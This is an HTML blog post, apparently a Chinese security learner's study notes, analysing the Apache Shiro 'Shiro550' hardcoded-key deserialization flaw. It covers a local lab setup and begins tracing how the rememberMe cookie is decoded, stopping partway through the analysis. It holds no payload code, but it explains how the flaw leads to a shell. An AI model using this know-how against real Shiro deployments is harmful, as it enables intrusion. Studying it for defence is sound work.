@@ -1,0 +1,1291 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/Suzen.jpg">
+  <link rel="icon" href="/img/Suzen.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#4F4F4F">
+  <meta name="author" content="Suzen">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="学习文章：https:&#x2F;&#x2F;drun1baby.top&#x2F;2022&#x2F;07&#x2F;10&#x2F;Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90&#x2F;  前言Shiro550漏洞的根本原因：使用固定 key 加密 影响版本：Shiro &lt;&#x3D; 1.2.4">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Shiro550">
+<meta property="og:url" content="https://yschen20.github.io/2026/02/10/Shiro550/index.html">
+<meta property="og:site_name" content="Suzen">
+<meta property="og:description" content="学习文章：https:&#x2F;&#x2F;drun1baby.top&#x2F;2022&#x2F;07&#x2F;10&#x2F;Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90&#x2F;  前言Shiro550漏洞的根本原因：使用固定 key 加密 影响版本：Shiro &lt;&#x3D; 1.2.4">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203162452681.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203162641861.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203162731555.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203163310643.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203163705843.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203163827105.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203164633990.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203164805823.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203164827552.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203165227542.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203193753856.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203193746472.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203193950212.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203195255626.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203195624956.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203195702648.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203200716681.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203203344015.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203203647171.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203205954619.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203204626238.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203205233803.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203205411887.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203205530023.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203205810106.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203212205039.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203212342723.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203212421302.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203214010459.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203214434672.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203215907881.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203220142001.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203220416608.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203220617229.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203221028342.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203221119327.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203221612488.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203222246430.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203221722027.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203221752374.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203221932025.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203223700213.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203224217012.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203224818875.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60204102041690.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60204102122842.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60204102600244.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60209234335957.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60209234423832.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60209234444868.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60209234831751.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60209234914283.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60209235122010.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60210105045161.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60210105119352.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60210105140984.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60210105210878.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60210105253366.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60210105439861.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60210105600413.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60210105720215.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60210105919313.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60210110055752.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60210110314395.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60210110937937.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60210111058267.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60210110541031.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60210111217418.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60210111447896.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60210111531610.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60210111612789.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60210111731604.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60210111713141.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60210112527688.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60210113029513.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60210113052071.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60210113149420.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60210113307546.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60210121643097.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60210134459002.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60210134557725.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60210134615428.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60210140852989.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60210141154499.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60210141127764.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60210141611787.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60210141531421.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60210162347154.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60210162809067.png">
+<meta property="article:published_time" content="2026-02-10T08:27:53.000Z">
+<meta property="article:modified_time" content="2026-02-10T08:28:38.531Z">
+<meta property="article:author" content="Suzen">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://yschen20.github.io/2025/11/12/0xGame2025-WEB-WP/60203162452681.png">
+<meta name="twitter:creator" content="@Suzen">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Shiro550 - Suzen</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/glassbg.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"yschen20.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2025-04-25T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+
+    
+
+<style type="text/css">
+  @keyframes spin3D {
+    from {
+      transform: rotate3d(0.5, 0.5, 0.5, 360deg);
+    }
+
+    to {
+      transform: rotate3d(0deg);
+    }
+  }
+
+  #loading {
+    height: 100%;
+    background-color: #172d4781;
+    backdrop-filter: saturate(100%) blur(10px);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    overflow: hidden;
+    z-index: 99999999;
+  }
+
+  .spinner-box {
+    width: 300px;
+    height: 300px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background-color: transparent;
+  }
+
+  .leo {
+    position: absolute;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    border-radius: 50%;
+  }
+
+  .blue-orbit {
+    width: 175px;
+    height: 175px;
+    border: 2px solid #1a91fa;
+    animation: spin3D 3s linear .2s infinite;
+  }
+
+  .green-orbit {
+    width: 135px;
+    height: 135px;
+    border: 2px solid #00ffdd;
+    animation: spin3D 2s linear 0s infinite;
+  }
+
+  .red-orbit {
+    width: 100px;
+    height: 100px;
+    border: 2px solid #d75151;
+    animation: spin3D 1s linear 0s infinite;
+  }
+
+  .white-orbit-a {
+    width: 70px;
+    height: 70px;
+    border: 1px solid #faf5f5;
+    animation: spin3D 3s linear 0s infinite;
+  }
+
+  .white-orbit-b {
+    width: 70px;
+    height: 70px;
+    border: 1px solid #faf5f5;
+    animation: spin3D 1.5s linear 0s infinite;
+  }
+
+  .nucleus {
+    width: 1px;
+    height: 1px;
+    border: 1px solid #ffffff;
+    animation: spin3D 1s linear 0s infinite;
+  }
+</style>
+
+<div id="loading">
+    <div class="spinner-box">
+        <div class="blue-orbit leo"></div>
+        <div class="green-orbit leo"></div>
+        <div class="red-orbit leo"></div>
+        <div class="white-orbit-a leo"></div>
+        <div class="white-orbit-b leo"></div>
+        <div class="nucleus leo"></div>
+    </div>
+</div>
+
+<script>
+  (function () {
+    const loaded = function () {
+      window.onload = function () {
+        const loader = document.getElementById("loading");
+        loader.className = "fadeout";
+        setTimeout(function () {
+            loader.style.display = "none";
+          },
+                500
+        );
+      }
+    };
+    loaded();
+  })();
+</script>
+
+
+
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Suzen的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/2.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Shiro550"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        Suzen
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-02-10 16:27" pubdate>
+          2026年2月10日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          29 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Shiro550</h1>
+            
+              <p id="updated-time" class="note note-info" style="display: none">
+                
+                  
+                    本文最后更新于 2026-02-10T16:28:38+08:00
+                  
+                  
+
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <blockquote>
+<p>学习文章：<a target="_blank" rel="noopener" href="https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/">https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/</a></p>
+</blockquote>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Shiro550漏洞的根本原因：使用固定 key 加密</p>
+<p>影响版本：Shiro &lt;&#x3D; 1.2.4</p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul>
+<li>jdk8u65</li>
+<li>Tomcat8</li>
+<li>shiro 1.2.4</li>
+</ul>
+<h2 id="jdk8u65"><a href="#jdk8u65" class="headerlink" title="jdk8u65"></a>jdk8u65</h2><p>在之前CC链的时候就搭好的：<a href="https://yschen20.github.io/2025/11/05/CC1%E9%93%BE%EF%BC%88TransformedMap%E7%89%88%EF%BC%89/#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">https://yschen20.github.io/2025/11/05/CC1%E9%93%BE%EF%BC%88TransformedMap%E7%89%88%EF%BC%89/#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA</a></p>
+<h2 id="Tomcat8"><a href="#Tomcat8" class="headerlink" title="Tomcat8"></a>Tomcat8</h2><p>下载地址：<a target="_blank" rel="noopener" href="https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.81/bin/">https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.81/bin/</a></p>
+<p>可以直接下这个 apache-tomcat-8.5.81.exe 安装程序来安装</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203162452681.png" srcset="/img/loading.gif" lazyload alt="image-20260203162452681"></p>
+<p>安装的时候到这里配置下端口和用户名密码</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203162641861.png" srcset="/img/loading.gif" lazyload alt="image-20260203162641861"></p>
+<p>然后是JDK的地址</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203162731555.png" srcset="/img/loading.gif" lazyload alt="image-20260203162731555"></p>
+<p>最后再换个安装路径就行了</p>
+<p>访问本地的8080端口，服务正常运行的</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203163310643.png" srcset="/img/loading.gif" lazyload alt="image-20260203163310643"></p>
+<p>想关闭或开启服务可以用下面的命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 开启服务</span><br>net start Tomcat8<br><span class="hljs-comment"># 关闭服务</span><br>net stop Tomcat8<br></code></pre></td></tr></table></figure>
+
+<p>出现下面这种情况就是权限不足</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203163705843.png" srcset="/img/loading.gif" lazyload alt="image-20260203163705843"></p>
+<p>以管理员身份运行就行</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203163827105.png" srcset="/img/loading.gif" lazyload alt="image-20260203163827105"></p>
+<h2 id="shiro-1-2-4"><a href="#shiro-1-2-4" class="headerlink" title="shiro 1.2.4"></a>shiro 1.2.4</h2><p>可以直接用 P 神的项目：<a target="_blank" rel="noopener" href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">https://github.com/phith0n/JavaThings/tree/master/shirodemo</a></p>
+<p>下载到本地，用IDEA打开这个项目，直接选择打开文件夹，路径是 shirodemo 那个目录</p>
+<p>然后是把刚才安装好的 Tomcat 服务添加进来</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203164633990.png" srcset="/img/loading.gif" lazyload alt="image-20260203164633990"></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203164805823.png" srcset="/img/loading.gif" lazyload alt="image-20260203164805823"></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203164827552.png" srcset="/img/loading.gif" lazyload alt="image-20260203164827552"></p>
+<p>然后在项目结构里添加工件</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203165227542.png" srcset="/img/loading.gif" lazyload alt="image-20260203165227542"></p>
+<p>不过 P 神的项目是弄好这个了的：</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203193753856.png" srcset="/img/loading.gif" lazyload alt="image-20260203193753856"></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203193746472.png" srcset="/img/loading.gif" lazyload alt="image-20260203193746472"></p>
+<p>最后设置运行与调试</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203193950212.png" srcset="/img/loading.gif" lazyload alt="image-20260203193950212"></p>
+<p>最后运行<code>login.jsp</code>文件就行了，访问：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8080</span><span class="hljs-regexp">/shirodemo_war/</span>login.jsp<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203195255626.png" srcset="/img/loading.gif" lazyload alt="image-20260203195255626"></p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xquery">用户名<span class="hljs-built_in">：root</span><br>密码：secret<br></code></pre></td></tr></table></figure>
+
+<p>环境就配好了</p>
+<h1 id="Shiro550漏洞分析"><a href="#Shiro550漏洞分析" class="headerlink" title="Shiro550漏洞分析"></a>Shiro550漏洞分析</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>用bp抓登录包，勾选上 Remember me</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203195624956.png" srcset="/img/loading.gif" lazyload alt="image-20260203195624956"></p>
+<p>如果登录成功的话，在响应包中的 Set-Cookie 里会有<code>rememberMe=deleteMe;</code>和<code>rememberMe=[一大串字符]</code></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203195702648.png" srcset="/img/loading.gif" lazyload alt="image-20260203195702648"></p>
+<p>之后的所有请求都会带有<code>rememberMe</code>字段</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203200716681.png" srcset="/img/loading.gif" lazyload alt="image-20260203200716681"></p>
+<p>可以利用这个<code>rememberMe</code>进行反序列化，从而 getshell</p>
+<blockquote>
+<p>Shiro1.2.4 及之前的版本中，AES 加密的密钥默认硬编码在代码里（Shiro-550）</p>
+<p>Shiro 1.2.4 之后的版本官方移除了代码中的默认密钥，要求开发者自己设置，如果开发者没有设置，则默认动态生成，降低了固定密钥泄漏的风险。</p>
+</blockquote>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h3><h4 id="Base64解密"><a href="#Base64解密" class="headerlink" title="Base64解密"></a>Base64解密</h4><p>去找 Cookie 里 rememberMe 的加密过程，在IDEA双击shift，在类里搜索Cookie，可以找到<code>CookieRememberMeManager</code>这个类</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203203344015.png" srcset="/img/loading.gif" lazyload alt="image-20260203203344015"></p>
+<p>最终锁定到这个类的<code>getRememberedSerializedIdentity()</code>：</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203203647171.png" srcset="/img/loading.gif" lazyload alt="image-20260203203647171"></p>
+<p>分析一下这个函数：是<code>protected</code>属性，返回一个字节数组<code>byte[]</code>（经过 base64 解码后的 <code>rememberMe</code>Cookie 的原始值），传入的参数是 Shiro 的一个上下文对象，封装了与当前主题（用户）相关的所有信息</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203205954619.png" srcset="/img/loading.gif" lazyload alt="image-20260203205954619"></p>
+<p>首先检查是不是 HTTP 请求，不是就返回<code>null</code>，如果是的话会检查是不是日志调试模式，是的话会记录一条日志说明原因</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203204626238.png" srcset="/img/loading.gif" lazyload alt="image-20260203204626238"></p>
+<p>然后检查当前用户的身份是不是已经被标记为移除</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203205233803.png" srcset="/img/loading.gif" lazyload alt="image-20260203205233803"></p>
+<p>然后是获取 HTTP 请求和响应对象，用于获取和写入 Cookie 吧</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203205411887.png" srcset="/img/loading.gif" lazyload alt="image-20260203205411887"></p>
+<p>然后这里就是获取 Cookie 中，并且会判断 Cookie 中是否含有<code>deleteme</code></p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/60203205530023.png" srcset="/img/loading.gif" lazyload alt="image-20260203205530023"></p>
